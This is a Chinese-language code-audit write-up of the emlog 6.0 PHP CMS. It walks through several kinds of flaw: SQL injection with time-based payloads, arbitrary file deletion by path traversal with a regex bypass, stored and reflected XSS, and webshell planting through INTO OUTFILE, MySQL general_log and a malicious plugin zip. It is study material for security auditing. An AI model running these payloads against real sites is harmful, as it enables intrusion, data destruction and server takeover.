---
title: emlog 6.0 代码审计
categories: PHP代码审计
---
# 前言
个人感觉 xss 写的不怎么好，慢慢来吧，加油


# 全局分析
网站结构

![](https://img-blog.csdnimg.cn/20210709144036809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
init.php

![](https://img-blog.csdnimg.cn/20210709144051435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进函数

![](https://img-blog.csdnimg.cn/20210709144114930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
magic_quotes_gpc函数 :
```
在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符 "\"

对POST、GET以及进行数据库操作的sql进行转义处理，以确保这些数据不会引起程序，特别是数据库语句
因为特殊字符引起的污染而出现致命的错误。防止sql注入
```

而stripslashes() 函数： 删除反斜杠

如此一来，对于get，post，cookie，request无过滤，可控参数

---
# SQL注入
## /admin/comment.php
这里对 ip 参数没有进行过滤直接拼接到sql语句

我想这里如果继续用intval函数的话，ip的记录会不完整，所以就没有进行处理

![](https://img-blog.csdnimg.cn/20210709144602256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进函数

![](https://img-blog.csdnimg.cn/20210709144624494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
单引号闭合，报错，延时，盲注都行



## /admin/tag.php

![](https://img-blog.csdnimg.cn/20210709144649669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进函数

![](https://img-blog.csdnimg.cn/20210709144704255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload:
```
tag[7 and if(2>1,sleep(5),1)]=1&token=e219a5d97a9e52275accddc25b30b390
```



## /admin/navbar.php
![](https://img-blog.csdnimg.cn/20210709144812541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

跟进函数

![](https://img-blog.csdnimg.cn/20210709144824174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload: 
```
pages[3 and if(2>1,sleep(5),1)]=1&token=e219a5d97a9e52275accddc25b30b390
```



## 备份数据库
![](https://img-blog.csdnimg.cn/20210709145043554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
先备份出来一份数据库，再修改后导入到数据库

![](https://img-blog.csdnimg.cn/20210709145059179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210709145106809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 任意文件删除

## 删除数据备份处


![](https://img-blog.csdnimg.cn/20210709145147294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包：

![](https://img-blog.csdnimg.cn/20210709145159651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
明显一个路径拼接

定位函数：/admin/data.php

![](https://img-blog.csdnimg.cn/2021070914521995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
无处理，直接unlink


## 删除头像处
/admin/blogger.php

![](https://img-blog.csdnimg.cn/20210709145240198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
往上追踪到photo参数：

![](https://img-blog.csdnimg.cn/20210709145305798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
验证：

上传用户头像触发 action=update

将photo写入文件

![](https://img-blog.csdnimg.cn/20210709145322217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
删除用户头像触发action=delicon：

![](https://img-blog.csdnimg.cn/20210709145339962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

成功删除：

![](https://img-blog.csdnimg.cn/20210709145355822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


## 删除插件处
/admin/plugin.php

![](https://img-blog.csdnimg.cn/20210709145418151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟踪emDeleteFile函数：

![](https://img-blog.csdnimg.cn/20210709145428713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

正则的意思：

```
^ :判断字符串开头的位置
([^\/]+) :一次或多次匹配下表中不存在的单个字符
\/ : 匹配 /
. : 匹配任何字符（行终止符除外）
* : 0次或无限次匹配上一个
```

两种绕过：
```
如果在windows直接用 \ 来表示路径就行了
Linux中 // 代表一个 /
```

抓包：

![](https://img-blog.csdnimg.cn/20210709145529217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload：
```
plugin=/../../robots.txt
```

拼接后就是：
```
../content/plugins//../../robots.txt
```
验证：

![](https://img-blog.csdnimg.cn/20210709145605885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


## 删除模板处
定位：/admin/template.php

![](https://img-blog.csdnimg.cn/20210709145626429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
可以看到还是用到了emDeleteFile函数，虽然这里有addslanshes函数
```
过滤 ' " \ %00 对 .. /没有作用
```

抓包：

![](https://img-blog.csdnimg.cn/2021070914572594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# SQL-webshell

都是在数据备份处利用

## 数据备份处sql写马
/admin/data.php

由于写马需要路径，不太好利用，不截图了，记一下

直接写文件：
```
SELECT "<?php phpinfo(); ?>" INTO outfile "E:\php\PHPTutorial\WWW\emlog\shell.php";
```

不仅需要 `root 权限`，还需要`关闭 --secure-file-priv(不是null，是关闭 off)`


## 日志写马
```
set global general_log = 'on'	# 开启日志

set global general_log_file = 'D:/application/phpstudy_pro/www/1.php'	# 设置日志路径，保存为PHP文件

select '<?php phpinfo(); ?>'  # 执行后会写入到日志中
```

---
# XSS

## 反射型
![](https://img-blog.csdnimg.cn/20210709150117549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
sql报错信息时没有过滤，利用报错的信息进行xss


## 存储型

![](https://img-blog.csdnimg.cn/20210709150200625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
/admin/write_log.php

直接插入html文档

抓包：

![](https://img-blog.csdnimg.cn/20210709150217528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

访问首页：

![](https://img-blog.csdnimg.cn/20210709150230871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

定位函数

![](https://img-blog.csdnimg.cn/20210709150243534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

$content只有经过转义处理，没有对html进行过滤

---
# 文件上传webshell
/admin/plugin.php

![](https://img-blog.csdnimg.cn/20210709150304230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进函数：

![](https://img-blog.csdnimg.cn/20210709150316635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

测试：

![](https://img-blog.csdnimg.cn/20210709150332445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
所以 getNameIndex() 函数`返回压缩包下的文件夹的名字`即 `cys/`  再经过 `substr `的处理 `$plugin_name 为 cys` 再经过 `$dir . $plugin_name . '.php'`拼接后是 `cys/cys.php`

在substr那一点就已经说明zip里面必须有文件夹且文件夹里面的文件与文件夹同名

有点说不明白了，还是看代码能意会

![](https://img-blog.csdnimg.cn/20210709150536517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
其实还可以直接下载它提供的模板，看一下他们的zip内容格式，进行比对

shell.php:

![](https://img-blog.csdnimg.cn/20210709151046883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


几篇不错的文章：

[代码审计--emlog6.0](https://foxgrin.github.io/posts/15210/)

[代码审计]Emlog 6.0 Beta](https://blog.dyboy.cn/websecurity/69.html)

[CMS代码审计之emlog 6.0](https://www.freebuf.com/vuls/195351.html)

[emlog6.0.0整站审计](https://blog.csdn.net/solitudi/article/details/117427509)
